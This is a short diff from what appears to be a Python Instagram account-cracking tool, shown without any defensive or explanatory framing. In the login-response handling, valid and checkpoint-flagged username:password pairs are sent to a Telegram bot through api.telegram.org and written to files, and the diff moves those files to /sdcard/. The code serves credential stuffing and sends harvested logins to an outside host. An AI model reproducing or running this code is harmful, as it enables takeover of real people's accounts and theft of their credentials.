@@ -139,7 +139,7 @@ def instagram():
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 						boooom=f"GOOD: "+user+":"+pasw
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
-						with open('Good(instgram).txt', 'a') as ff:
+						with open('/sdcard/Good(instgram).txt', 'a') as ff:
 							ff.write(f"\nuser&num&emil: "+user+":"+pasw)
 					elif ('"message":"checkpoint_required"') in login:
 						os.system("clear")
@@ -148,7 +148,7 @@ def instagram():
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 						booom=f"Checkpoint: "+user+":"+pasw
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
-						with open("checkpoint.txt", "a") as dd:
+						with open("/sdcard/checkpoint.txt", "a") as dd:
 							dd.write(f"\nuser&num&emil: "+user+":"+pasw)
 					else:
 						os.system("clear")
